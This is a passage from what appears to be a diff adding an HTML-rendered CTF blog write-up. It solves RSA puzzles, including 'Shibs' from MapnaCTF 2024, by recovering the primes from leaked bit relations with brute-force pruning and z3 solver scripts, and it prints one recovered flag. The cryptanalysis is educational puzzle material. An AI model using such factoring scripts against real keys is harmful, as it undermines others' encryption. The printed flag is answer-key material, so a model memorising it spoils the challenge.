+                &lt;span class=&quot;n&quot;&gt;nx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;nf&quot;&gt;if &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;px&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;qx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nx&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;qx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_tracked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;new_tracked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;qx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;tracked&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_tracked&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;new_tracked&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;for &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tracked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;new_tracked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;for &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_tracked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;long_to_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;pow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;pow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;running this script we get our flag: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FLAG{sequ4ntia1_prim4_fact0rizati0n}&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;now i could have ended this here, but this is where things start getting more interesting! it turns out that you need not write out a whole brute script from scratch to prune over the bits and solve for $p$ and $q$. you can instead just use a z3solver to do that for us. lets solve the above challenge using a z3solver. here’s my script that works great&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z3&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Crypto.Util.number&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#
+&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;bitlen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;P&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;BitVec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bitlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;Q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;BitVec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bitlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;mask&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;55&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# r = p &amp;amp; mask
+# mask = mask &amp;lt;&amp;lt; 1
+# r += q &amp;amp; mask
+&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;solver&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Solver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;solver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;P&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;solver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;P&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mask&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;nf&quot;&gt;if &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;solver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;M&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;solver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;M&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;as_long&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;M&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Q&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;as_long&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;phi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;pow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;phi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;long_to_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;pow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;sometimes it turns out that writing brute scripts from scratch becomes difficult and complicated, hence we rely on z3solver.&lt;/p&gt;
+
+&lt;h2 id=&quot;shibs-mapnactf-2024&quot;&gt;Shibs [MapnaCTF 2024]&lt;/h2&gt;
+&lt;p&gt;another rsa problem where we know $n$, $e$ and $c$. however we also know $p$ $\&amp;amp;$ $q$ and we are given that $q$ is just $p[:s]$ $+$ $p[s:]$ for some random hidden $s$.&lt;/p&gt;
+
+&lt;h3 id=&quot;solution-2&quot;&gt;Solution&lt;/h3&gt;
+
+&lt;p&gt;we’ll do the same again. lets pump these all into the z3solver again and let it do the magic for us. since we also dont know $s$, i’ll brute over that too. here’s my script&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Crypto.Util.number&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z3&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;enc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#
+&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;bitlen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#
+&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;P&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;BitVec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bitlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;Q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;BitVec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bitlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
+
+    &lt;span class=&quot;n&quot;&gt;solver&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Solver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;solver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;P&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;solver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;P&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;shifted_P&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Concat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Extract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bitlen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Extract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bitlen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bitlen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;solver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shifted_P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;nf&quot;&gt;if &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;solver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;M&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;solver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;M&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;as_long&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;M&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Q&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;as_long&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+        &lt;span class=&quot;n&quot;&gt;phi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
